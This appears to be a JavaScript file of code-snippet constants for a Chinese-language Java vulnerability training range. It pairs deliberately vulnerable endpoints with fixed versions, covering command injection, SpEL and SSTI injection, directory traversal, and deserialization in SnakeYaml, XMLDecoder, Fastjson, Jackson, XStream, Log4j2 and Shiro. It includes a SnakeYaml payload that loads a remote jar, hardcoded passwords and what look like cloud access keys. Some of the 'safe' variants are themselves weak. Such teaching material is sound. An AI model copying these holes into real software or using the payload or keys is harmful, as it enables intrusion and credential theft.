    '    String callback = request.getParameter("callback");\n' +
    '    String sensitiveData = "{\\"username\\":\\"admin\\",\\"password\\":\\"Admin123\\"}";\n' +
    '\n' +
    '    // 返回数据包装成 JSONP 格式，并没有对 callback 参数进行安全验证\n' +
    '    String jsonpResponse = callback + "(" + sensitiveData + ");";\n' +
    '\n' +
    '    // 设置响应类型为 JavaScript 脚本\n' +
    '    response.setContentType("application/javascript");\n' +
    '    response.getWriter().write(jsonpResponse);\n' +
    '}\n'

const safeJSONP = "// 校验回调函数名是否合法\n" +
    "if (callback == null || !callback.matches(\"^[a-zA-Z_$][a-zA-Z0-9_$]*$\")) {\n" +
    "    response.setStatus(HttpServletResponse.SC_BAD_REQUEST);\n" +
    "    response.getWriter().write(\"Invalid callback\");\n" +
    "    return;\n" +
    "}"

const vulDos = "public void vul(Integer width,Integer height,HttpServletResponse response) throws IOException {\n" +
    "    response.setContentType(\"image/jpeg\");\n" +
    "    response.setHeader(\"Pragma\", \"no-cache\");\n" +
    "    response.setHeader(\"Cache-Control\", \"no-cache\");\n" +
    "    // 验证码参数可控 造成拒绝服务攻击\n" +
    "    ShearCaptcha shearCaptcha = CaptchaUtil.createShearCaptcha(width, height,4,3);\n" +
    "    try {\n" +
    "        shearCaptcha.write(response.getOutputStream());\n" +
    "    } catch (IOException e) {\n" +
    "        throw new RuntimeException(e);\n" +
    "    }\n" +
    "}"
const vul2Dos = "// 如果解压出的文件是ZIP文件，则递归解压\n" +
    "if (entry.getName().endsWith(\".zip\")) {\n" +
    "    // 创建临时文件来存储这个ZIP\n" +
    "    File tempFile = File.createTempFile(\"unzip\", \".zip\");\n" +
    "    try (FileOutputStream fos = new FileOutputStream(tempFile)) {\n" +
    "        byte[] buffer = new byte[1024];\n" +
    "        int length;\n" +
    "        while ((length = zipInputStream.read(buffer)) != -1) {\n" +
    "            fos.write(buffer, 0, length);\n" +
    "        }\n" +
    "    }\n" +
    "    // 递归解压这个新的ZIP文件\n" +
    "    unzip(tempFile, currentDepth + 1, maxDepth);\n" +
    "    // 解压完成后删除临时文件\n" +
    "    tempFile.delete();\n" +
    "} "

const vulXpath = "public R vul(String username,String password) {\n" +
    "    try {\n" +
    "        // 构造XML数据\n" +
    "        String xmlData = \"<users><user><username>admin</username><password>password</password></user></users>\";\n" +
    "        \n" +
    "\t\t// 解析XML文档\n" +
    "        DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();\n" +
    "        Document doc = builder.parse(new InputSource(new StringReader(xmlData)));\n" +
    "\n" +
    "        // 构造XPath表达式（存在注入漏洞）\n" +
    "        XPath xpath = XPathFactory.newInstance().newXPath();\n" +
    "        String expression = \"/users/user[username='\" + username + \"' and password='\" + password + \"']\";\n" +
    "        NodeList nodes = (NodeList) xpath.evaluate(expression, doc, XPathConstants.NODESET);\n" +
    "        if (nodes.getLength() > 0) {\n" +
    "            return R.ok(\"用户名和密码验证通过！\");\n" +
    "        } else {\n" +
    "            return R.ok(\"用户名或密码错误！\");\n" +
    "        }\n" +
    "        ...\n" +
    "}"
const safeXpath = "public R safe(String username,String password) {\n" +
    "    try {\n" +
    "        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n" +
    "        DocumentBuilder builder = factory.newDocumentBuilder();\n" +
    "        String xml = \"<users><user><username>admin</username><password>password</password></user></users>\";\n" +
    "        Document doc = builder.parse(new InputSource(new StringReader(xml)));\n" +
    "\n" +
    "        // 使用StringEscapeUtils.escapeXml10()方法对用户输入进行XML实体转义\n" +
    "        String escapedUsername = StringEscapeUtils.escapeXml10(username);\n" +
    "        String escapedPassword = StringEscapeUtils.escapeXml10(password);\n" +
    "\n" +
    "        XPath xpath = XPathFactory.newInstance().newXPath();\n" +
    "        String expression = \"/users/user[username='\" + escapedUsername + \"' and password='\" + escapedPassword + \"']\";\n" +
    "        NodeList nodes = (NodeList) xpath.evaluate(expression, doc, XPathConstants.NODESET);\n" +
    "\n" +
    "        if (nodes.getLength() > 0) {\n" +
    "            return R.ok(\"用户名和密码验证通过！欢迎：\" + escapedUsername);\n" +
    "        } else {\n" +
    "            return R.error(\"认证失败：用户名或密码错误\");\n" +
    "        }\n" +
    "        ...\n" +
    "}\n"

// js泄漏-硬编码
const hardCoding = "function login() {\n" +
    "    // 硬编码的用户名和密码\n" +
    "    const hardcodedUsername = \"superadmin\";\n" +
    "    const hardcodedPassword = \"Admin@1024.com\";\n" +
    "\n" +
    "    const username = document.getElementById(\"username\").value;\n" +
    "    const password = document.getElementById(\"password\").value;\n" +
    "    if (username === hardcodedUsername && password === hardcodedPassword) {\n" +
    "        window.location.href = \"/infoLeak/js/loginSuccess\";\n" +
    "    } else {\n" +
    "        document.getElementById(\"error\").textContent = \"用户名或密码错误！\";\n" +
    "    }\n" +
    "}"

// js泄漏-webpack
const infoLeakJs = "var r = new i({\n" +
    "    SecretId: \"AKID4xax3skP8jyDs6SZS5SZR5TcfSyC9p9H\",\n" +
    "    SecretKey: \"vaz81e2B5j89iYB5FtIRJvHPIvJRJvHO\"\n" +
    "});\n" +
    "r.uploadFile({\n" +
    "    Bucket: \"official-website-1305607643\",\n" +
    "    Region: \"ap-beijing\",\n" +
    "    Key: o,\n" +
    "    Body: t,\n" +
    "    SliceSize: 5242880\n" +
    "}, (function (t, r) {\n" +
    "    t ? n(\"上传失败\") : e({\n" +
    "        code: 200,\n" +
    "        data: {path: \"https://official-website-1305887643.cos.ap-beijing.myqcloud.com/\".concat(o)}\n" +
    "    })\n" +
    "})";
const springBootSwagger = "return new Docket(DocumentationType.OAS_30)\n" +
    "        .pathMapping(\"/\")\n" +
    "        .enable(swaggerProperties.getEnable())//生产禁用\n" +
    "        .apiInfo(apiInfo())\n" +
    "        .select()\n" +
    "        .apis(RequestHandlerSelectors.basePackage(\"top.whgojp\"))//按包扫描,也可以扫描共同的父包，不会显示basic-error-controller\n" +
    "        .paths(PathSelectors.any())\n" +
    "        .build();\n" +
    "}\n" +
    "/**\n" +
    " * API 页面上半部分展示信息\n" +
    " */\n" +
    "private ApiInfo apiInfo() {\n" +
    "return new ApiInfoBuilder()\n" +
    "        .title(swaggerProperties.getTitle())//标题\n" +
    "        .description(swaggerProperties.getDescription())//描述\n" +
    "        .contact(new Contact(swaggerProperties.getAuthor(), swaggerProperties.getUrl(), swaggerProperties.getEmail()))//作者信息\n" +
    "        .version(swaggerProperties.getVersion())//版本号\n" +
    "        .build();\n" +
    "}";

const springBootActuator = "management:\n" +
    "  # 端点信息接口使用的端口，为了和主系统接口使用的端口进行分离\n" +
    "  server:\n" +
    "    port: 8080\n" +
    "  # 端点健康情况，默认值\"never\"，设置为\"always\"可以显示硬盘使用情况和线程情况\n" +
    "  endpoint:\n" +
    "    health:\n" +
    "      show-details: always\n" +
    "  # 设置端点暴露的哪些内容，默认[\"health\",\"info\"]，设置\"*\"代表暴露所有可访问的端点\n" +
    "  endpoints:\n" +
    "    web:\n" +
    "      exposure:\n" +
    "        include: '*'\n" +
    "      base-path: /sys/actuator\n" +
    "\n" +
    "// 相关端点信息\n" +
    "路径          描述          默认启用\n" +
    "auditevents  显示当前应用程序的审计事件信息  Yes\n" +
    "beans  显示一个应用中所有Spring Beans的完整列表  Yes\n" +
    "conditions  显示配置类和自动配置类(configuration and auto-configuration  classes)的状态及它们被应用或未被应用的原因configprops  显示一个所有@ConfigurationProperties的集合列表  Yes\n" +
    "env  显示来自Spring的 ConfigurableEnvironment的属性  Yes\n" +
    "flyway  显示数据库迁移路径，如果有的话  Yes\n" +
    "health  显示应用的健康信息（当使用一个未认证连接访问时显示一个简单  的’status’，使用认证连接访问则显示全部信息详情）info  显示任意的应用信息  Yes\n" +
    "liquibase  展示任何Liquibase数据库迁移路径，如果有的话  Yes\n" +
    "metrics  展示当前应用的metrics信息  Yes\n" +
    "mappings  显示一个所有@RequestMapping路径的集合列表  Yes\n" +
    "scheduledtasks  显示应用程序中的计划任务  Yes\n" +
    "sessions  允许从Spring会话支持的会话存储中检索和删除(retrieval and deletion)  用户会话。使用Spring Session对反应性Web应用程序的支持时不可用。shutdown  允许应用以优雅的方式关闭（默认情况下不启用）  No\n" +
    "threaddump  执行一个线程dump  Yes\n" +
    "heapdump  返回一个GZip压缩的hprof堆dump文件  Yes\n" +
    "jolokia  通过HTTP暴露JMX beans（当Jolokia在类路径上时，WebFlux不可用）  Yes\n" +
    "logfile  返回日志文件内容（如果设置了logging.file或logging.path属性的话），支持使用HTTP Range头接收日志文件内容的部分信息  Yes\n" +
    "prometheus  以可以被Prometheus服务器抓取的格式显示metrics信息  Yes";
const springBootDruid = "druid:\n" +
    "  ...\n" +
    "  filters: stat,log4j     # wall 这里关闭sql防火墙\n" +
    "  stat-view-servlet:\n" +
    "    enabled: true\n" +
    "    url-pattern: /druid/*\n" +
    "#        login-username: admin\n" +
    "#        login-password: admin\n" +
    "    reset-enable: false\n" +
    "  # 防火墙配置\n" +
    "#      wall:\n" +
    "#        config:\n" +
    "#          multi-statement-allow: false"

const dirTraversal = 'public String listDirectory(String dir) {\n' +
    '    String staticFolderPath = sysConstant.getStaticFolder();\n' +
    '    File baseDir = new File(staticFolderPath);\n' +
    '    File requestedDir = new File(baseDir, dir);\n' +
    '\n' +
    '    // 生成HTML输出\n' +
    '    StringBuilder response = new StringBuilder();\n' +
    '    response.append("<!DOCTYPE HTML>");\n' +
    '    ...\n' +
    '\n' +
    '    File[] files = requestedDir.listFiles();\n' +
    '    if (files != null) {\n' +
    '        for (File file : files) {\n' +
    '            response.append("<li>");\n' +
    '            if (file.isDirectory()) {\n' +
    '                response.append("<a href=\\"?dir=").append(dir);\n' +
    '                if (!dir.endsWith("/")) {\n' +
    '                    response.append("/");\n' +
    '                }\n' +
    '                response.append(file.getName()).append("/\\">").append(file.getName()).append("/</a>");\n' +
    '    ...\n' +
    '    return response.toString();\n' +
    '}'

const safe1ListDirectory = 'public String safe1(String dir) {\n' +
    '    String staticFolderPath = sysConstant.getStaticFolder();\n' +
    '    File baseDir = new File(staticFolderPath);\n' +
    '\n' +
    '    String decodedDir = URLDecoder.decode(dir, StandardCharsets.UTF_8.name());\n' +
    '\n' +
    '    // 进行敏感字符过滤\n' +
    '    if (decodedDir.contains(".") || decodedDir.contains(";") || decodedDir.contains("\\\\") || decodedDir.contains("%")) {\n' +
    '        return "非法字符！";\n' +
    '    }\n' +
    '    File requestedDir = new File(baseDir, dir);\n' +
    '    ...\n' +
    '}'

const safe2ListDirectory = "public String safe2(String dir) {\n" +
    "    String staticFolderPath = sysConstant.getStaticFolder();\n" +
    "    File baseDir = new File(staticFolderPath);\n" +
    "    File requestedDir = new File(baseDir, dir);\n" +
    "\n" +
    "    // 检查请求的目录是否在规定目录内\n" +
    "try {\n" +
    "    if (!requestedDir.getCanonicalPath().startsWith(baseDir.getCanonicalPath()) || !requestedDir.isDirectory()) {\n" +
    "        return \"Directory not found or access denied.\";\n" +
    "    }\n" +
    "} catch (IOException e) {\n" +
    "    return \"Error resolving directory path.\";\n" +
    "}\n" +
    "...";
const infoLeakCeShi = "public String ping(String ip, Model model) {\n" +
    "    String result = \"\";\n" +
    "    if (ip != null && !ip.isEmpty()) {\n" +
    "        try {\n" +
    "            // 这里存在命令注入漏洞，用户输入没有经过过滤直接拼接到命令中执行\n" +
    "            log.info(\"测试命令：\"+ip);\n" +
    "            String command = \"ping -c 4 \" + ip;\n" +
    "//                Process process = Runtime.getRuntime().exec(command);\n" +
    "            Process process = Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", command});\n" +
    "            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n" +
    "            String line;\n" +
    "            StringBuilder output = new StringBuilder();\n" +
    "            while ((line = reader.readLine()) != null) {\n" +
    "                output.append(line).append(\"\\n\");\n" +
    "            }\n" +
    "            reader.close();\n" +
    "            result = output.toString();\n" +
    "        } catch (Exception e) {\n" +
    "            result = \"Error: \" + e.getMessage();\n" +
    "    ...\n" +
    "}\n";

// java专题 SPEL注入
const spelVul = "public R vul(String ex) {\n" +
    "    // 创建SpEL解析器，ExpressionParser接口用于表示解析器，SpelExpressionParser为默认实现\n" +
    "    ExpressionParser parser = new SpelExpressionParser();\n" +
    "    \n" +
    "    // Expression expression = parser.parseExpression(ex);\n" +
    "    // String result =  expression.getValue().toString();\n" +
    "    \n" +
    "    // 构造上下文 上下文其实就是设置好某些变量的值，执行表达式时根据这些设置好的内容区获取值 在不配置的情况下具有默认类型的上下文\n" +
    "    EvaluationContext evaluationContext = new StandardEvaluationContext();\n" +
    "    \n" +
    "    // 解析表达式，将用户输入的字符串解析为Expression对象\n" +
    "    Expression exp = parser.parseExpression(ex);\n" +
    "    \n" +
    "    // 通过上下文计算表达式的值，并将结果转换为字符串\n" +
    "    String result = exp.getValue(evaluationContext).toString();\n" +
    "    return R.ok(result);\n" +
    "}"

const spelSafe = "public R safe(String ex) {\n" +
    "    ExpressionParser parser = new SpelExpressionParser();\n" +
    "    \n" +
    "    // 使用 SimpleEvaluationContext 限制表达式功能(Java类型引用、构造函数调用、Bean引用)，防止危险的操作\n" +
    "    EvaluationContext simpleContext = SimpleEvaluationContext.forReadOnlyDataBinding().build();\n" +
    "    \n" +
    "    Expression exp = parser.parseExpression(ex);\n" +
    "    \n" +
    "    String result = exp.getValue(simpleContext).toString();\n" +
    "    return R.ok(result);\n" +
    "}\n"

const sstiVul = "public String vul1(@RequestParam String para, Model model) {\n" +
    "    // 用户输入直接拼接到模板路径，可能导致SSTI（服务器端模板注入）漏洞\n" +
    "    return \"/vul/ssti/\" + para;\n" +
    "}\n" +
    "\n" +
    "public void vul2(@PathVariable String path) {\n" +
    "    log.info(\"SSTI注入：\"+path);\n" +
    "}\n" +
    "\n" +
    "\t// 缺陷组件版本参考\n" +
    "<parent>\n" +
    "    <groupId>org.springframework.boot</groupId>\n" +
    "    <artifactId>spring-boot-starter-parent</artifactId>\n" +
    "<!--        <version>2.7.14</version>-->\n" +
    "    <version>2.4.1</version>\n" +
    "    <relativePath/>\n" +
    "</parent>\n" +
    "\n" +
    "<dependency>\n" +
    "    <groupId>org.springframework.boot</groupId>\n" +
    "    <artifactId>spring-boot-starter-thymeleaf</artifactId>\n" +
    "    <version>2.4.1</version>\n" +
    "</dependency>\n"
const sstiSafe = "public String safe1(String para, Model model) {\n" +
    "    List<String> white_list = new ArrayList<>(Arrays.asList(\"vul\", \"ssti\"));\n" +
    "    if (white_list.contains(para)){\n" +
    "        return \"vul/ssti\" + para;\n" +
    "    } else{\n" +
    "        return \"common/401\";\n" +
    "    }\n" +
    "}\n" +
    "@GetMapping(\"/safe2/{path}\")\n" +
    "public void safe2(@PathVariable String path, HttpServletResponse response) {\n" +
    "    log.info(\"SSTI注入：\"+path);\n" +
    "}"

const vulReadObject = "public R vul(String payload) {\n" +
    "    try {\n" +
    "        payload = payload.replace(\" \", \"+\");\n" +
    "        byte[] bytes = Base64.getDecoder().decode(payload);\n" +
    "        ByteArrayInputStream stream = new ByteArrayInputStream(bytes);\n" +
    "        java.io.ObjectInputStream in = new java.io.ObjectInputStream(stream);\n" +
    "        in.readObject();\n" +
    "        in.close();\n" +
    "        return R.ok(\"[+]Java反序列化：ObjectInputStream.readObject()\");\n" +
    "    } catch (Exception e) {\n" +
    "        return R.error(\"[-]请输入正确的Payload！\\n\"+e.getMessage());\n" +
    "    }\n" +
    "}"
const safeReadObject1 = "public R safe1(String payload) {\n" +
    "    // 安全措施：禁用不安全的反序列化\n" +
    "    System.setProperty(\"org.apache.commons.collections.enableUnsafeSerialization\", \"false\");\n" +
    "    try {\n" +
    "        payload = payload.replace(\" \", \"+\");\n" +
    "        byte[] bytes = Base64.getDecoder().decode(payload);\n" +
    "        ByteArrayInputStream stream = new ByteArrayInputStream(bytes);\n" +
    "        java.io.ObjectInputStream in = new java.io.ObjectInputStream(stream);\n" +
    "        in.readObject();\n" +
    "        in.close();\n" +
    "        return R.ok(\"[+]Java反序列化：ObjectInputStream.readObject()\");\n" +
    "    } catch (Exception e) {\n" +
    "        return R.error(\"[-]请输入正确的Payload！\\n\"+e.getMessage());\n" +
    "    }\n" +
    "}"
const safeReadObject2 = "public R safe2(String payload) {\n" +
    "    try {\n" +
    "        payload = payload.replace(\" \", \"+\");\n" +
    "        byte[] bytes = Base64.getDecoder().decode(payload);\n" +
    "        ByteArrayInputStream stream = new ByteArrayInputStream(bytes);\n" +
    "        // 创建 ValidatingObjectInputStream 对象\n" +
    "        ValidatingObjectInputStream ois = new ValidatingObjectInputStream(stream);\n" +
    "        // 设置拒绝反序列化的类\n" +
    "        ois.reject(java.lang.Runtime.class);\n" +
    "        ois.reject(java.lang.ProcessBuilder.class);\n" +
    "        // 只允许反序列化Sqli类\n" +
    "        ois.accept(Sqli.class);\n" +
    "        ois.readObject();\n" +
    "        return R.ok(\"[+]Java反序列化：ObjectInputStream.readObject()\");\n" +
    "    } catch (Exception e) {\n" +
    "        return R.error(\"[-]请输入正确的Payload！\\n\"+e.getMessage());\n" +
    "    }\n" +
    "}"
const safeReadObject3 = "safeReadObject3"

const vulSnakeYaml = "public R vul(String payload) {\n" +
    "    Yaml y = new Yaml();\n" +
    "    y.load(payload);\n" +
    "    return R.ok(\"[+]Java反序列化：SnakeYaml\");\n" +
    "}\n" +
    "\n" +
    "// payload示例\n" +
    "payload=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://127.0.0.1:7777/yaml-payload.jar']]]]\n"
const safeSnakeYaml = "public R safe(String payload) {\n" +
    "    try {\n" +
    "        Yaml y = new Yaml(new SafeConstructor());\n" +
    "        y.load(payload);\n" +
    "        return R.ok(\"[+]Java反序列化：SnakeYaml安全构造\");\n" +
    "    } catch (Exception e) {\n" +
    "        return R.error(\"[-]Java反序列化：SnakeYaml反序列化失败\");\n" +
    "    }\n" +
    "}"

const vulXmlDecoder = 'public R vul(String payload) {\n' +
    '    String[] strCmd = payload.split(" ");\n' +
    '    StringBuilder xml = new StringBuilder()\n' +
    '            .append("<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>")\n' +
    '            .append("<java version=\\"1.8.0_151\\" class=\\"java.beans.XMLDecoder\\">")\n' +
    '            .append("<object class=\\"java.lang.ProcessBuilder\\">")\n' +
    '            .append("<array class=\\"java.lang.String\\" length=\\"").append(strCmd.length).append("\\">");\n' +
    '    for (int i = 0; i < strCmd.length; i++) {\n' +
    '        xml.append("<void index=\\"").append(i).append("\\"><string>")\n' +
    '                .append(strCmd[i]).append("</string></void>");\n' +
    '    }\n' +
    '    xml.append("</array><void method=\\"start\\" /></object></java>");\n' +
    '    try {\n' +
    '        new java.beans.XMLDecoder(new ByteArrayInputStream(xml.toString().getBytes(StandardCharsets.UTF_8)))\n' +
    '                .readObject().toString();\n' +
    '        return R.ok("命令执行成功");\n' +
    '    } catch (Exception e) {\n' +
    '        return R.error("命令执行失败: " + e.getMessage());\n' +
    '    }\n' +
    '}'

const safeXmlDecoder = 'public R safe(@RequestParam String payload) {\n' +
    '    try {\n' +
    '        // 构建 XML 字符串\n' +
    '        ...\n' +
    '        // 使用 SAX 解析器解析 XML\n' +
    '        SAXParserFactory factory = SAXParserFactory.newInstance();\n' +
    '        SAXParser saxParser = factory.newSAXParser();\n' +
    '        CommandHandler handler = new CommandHandler();\n' +
    '        // 将 ByteArrayInputStream 包装成 InputSource\n' +
    '        InputSource inputSource = new InputSource(new ByteArrayInputStream(xml.toString().getBytes(StandardCharsets.UTF_8)));\n' +
    '        saxParser.parse(inputSource, handler);\n' +
    '        // 获取解析后的命令参数\n' +
    '        List<String> args = handler.getArgs();\n' +
    '        // 处理解析后的命令参数\n' +
    '        System.out.println("Parsed command: " + String.join(" ", args));\n' +
    '        return R.ok("[+]命令解析成功:"+String.join(" ", args));\n' +
    '    } catch (Exception e) {\n' +
    '        return R.error("[-]命令解析失败: " + e.getMessage());\n' +
    '    }\n' +
    '}'

const vulFastjson = "public String vul(@RequestBody String content) {\n" +
    "    try {\n" +
    "        JSONObject jsonObject = JSON.parseObject(content);\n" +
    "        return jsonObject.toString();\n" +
    "    } catch (Exception e) {\n" +
    "        return e.getMessage();\n" +
    "    }\n" +
    "}\n" +
    "\n" +
    "<dependency>\n" +
    "    <groupId>com.alibaba</groupId>\n" +
    "    <artifactId>fastjson</artifactId>\n" +
    "    <version>1.2.37</version>\n" +
    "</dependency>"
const safeFastjson = "public String safe(@RequestBody String content) {\n" +
    "    try {\n" +
    "        // 1、禁用 AutoType\n" +
    "        ParserConfig.getGlobalInstance().setAutoTypeSupport(false);\n" +
    "        // 2、使用AutoType白名单机制\n" +
    "//            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n" +
    "//            ParserConfig.getGlobalInstance().addAccept(\"top.whgojp.WhiteListClass\");\n" +
    "        // 3、1.2.68之后的版本，Fastjson真家里safeMode的支持\n" +
    "//            ParserConfig.getGlobalInstance().setSafeMode(true);\n" +
    "//            JSONObject jsonObject = JSON.parseObject(content, Feature.DisableSpecialKeyDetect);\n" +
    "        JSONObject jsonObject = JSON.parseObject(content);\n" +
    "        return jsonObject.toString();\n" +
    "    } catch (Exception e) {\n" +
    "        return e.getMessage();\n" +
    "    }\n" +
    "}\n" +
    "<dependency>\n" +
    "    <groupId>com.alibaba</groupId>\n" +
    "    <artifactId>fastjson</artifactId>\n" +
    "    <version>1.2.83版本以上</version>\n" +
    "</dependency>"

const vulJackson = "public String vul(@RequestBody String content) {\n" +
    "    try {\n" +
    "        ObjectMapper mapper = new ObjectMapper();\n" +
    "        mapper.enableDefaultTyping(); // 启用多态类型处理\n" +
    "\n" +
    "        // 反序列化接收的JSON数据，触发漏洞\n" +
    "        Object obj = mapper.readValue(content, Object.class);\n" +
    "        return \"[+]Jackson 反序列化: \" + obj.toString();\n" +
    "    } catch (Exception e) {\n" +
    "        e.printStackTrace();\n" +
    "        return \"[-]Jackson反序列化失败\";\n" +
    "    }\n" +
    "}"

const safeJackson = "public String safe(@RequestBody String payload) {\n" +
    "    try {\n" +
    "        ObjectMapper mapper = new ObjectMapper();\n" +
    "\n" +
    "        // 启用安全的类型验证\n" +
    "        mapper.activateDefaultTyping(\n" +
    "                LaissezFaireSubTypeValidator.instance,\n" +
    "                ObjectMapper.DefaultTyping.NON_FINAL\n" +
    "        );\n" +
    "        mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);\n" +
    "\n" +
    "        // 反序列化传入的JSON数据\n" +
    "        Map<String, Object> safePayload = mapper.readValue(payload, Map.class);\n" +
    "        return mapper.writeValueAsString(safePayload);\n" +
    "    } catch (Exception e) {\n" +
    "        e.printStackTrace();\n" +
    "        return \"Jackson Safe Deserialization Error\";\n" +
    "    }\n" +
    "}"

const vulXstream = "public String vul(@RequestBody String content) {\n" +
    "    XStream xs = new XStream();\n" +
    "    Object result = xs.fromXML(content);  // 反序列化得到的对象\n" +
    "\n" +
    "    // 检查反序列化后的结果并返回相关信息\n" +
    "    return \"组件漏洞-Xstream Vul, 反序列化结果: \\n\" + result.toString();\n" +
    "}"

const safeXstreamBlackList = "public String safe1(@RequestBody String content) {\n" +
    "    XStream xstream = new XStream();\n" +
    "    // 首先清除默认设置，然后进行自定义设置\n" +
    "    xstream.addPermission(NoTypePermission.NONE);\n" +
    "    // 将ImageIO类加入黑名单\n" +
    "    xstream.denyPermission(new ExplicitTypePermission(new Class[]{ImageIO.class}));\n" +
    "    xstream.fromXML(content);\n" +
    "    return \"组件漏洞-Xstream Safe-BlackList\";\n" +
    "}"

const safeXstreamWhiteList = "public String safe2(@RequestBody String content) {\n" +
    "    XStream xstream = new XStream();\n" +
    "     // 首先清除默认设置，然后进行自定义设置\n" +
    "    xstream.addPermission(NoTypePermission.NONE);\n" +
    "    // 添加一些基础的类型，如Array、NULL、primitive\n" +
    "    xstream.addPermission(ArrayTypePermission.ARRAYS);\n" +
    "    xstream.addPermission(NullPermission.NULL);\n" +
    "    xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);\n" +
    "    // 添加自定义的类列表\n" +
    "    xstream.addPermission(new ExplicitTypePermission(new Class[]{Date.class}));\n" +
    "    return \"组件漏洞-Xstream Safe-WhiteList\";\n" +
    "}"

const vulLog4j2 = "public String vul(String payload) {\n" +
    "    //此处解析${}从而触发漏洞\n" +
    "    logger.error(payload);  \n" +
    "    return \"[+]Log4j2反序列化：\"+payload;\n" +
    "}\n" +
    "\n" +
    "<dependency>\n" +
    "    <groupId>org.apache.logging.log4j</groupId>\n" +
    "    <artifactId>log4j-core</artifactId>\n" +
    "    <version>2.8.2</version>\n" +
    "</dependency>\n" +
    "\n" +
    "<dependency>\n" +
    "    <groupId>org.apache.logging.log4j</groupId>\n" +
    "    <artifactId>log4j-api</artifactId>\n" +
    "    <version>2.8.2</version>\n" +
    "</dependency>"
const safeLog4j2 = "safeLog4j2"

const vulShiro = "public R getShiroKey(){\n" +
    "    try{\n" +
    "        byte[] key = new CookieRememberMeManager().getCipherKey();\n" +
    "        return R.ok(\"Shiro AES密钥硬编码为：\"+new String(Base64.getEncoder().encode(key)));\n" +
    "    }catch (Exception ignored){\n" +
    "        return R.error(\"获取AES密钥失败！\");\n" +
    "    }\n" +
    "}\n" +
    "\n" +
    "<dependency>\n" +
    "    <groupId>org.apache.shiro</groupId>\n" +
    "    <artifactId>shiro-spring</artifactId>\n" +
    "    <version>1.2.4</version>\n" +
    "</dependency>"
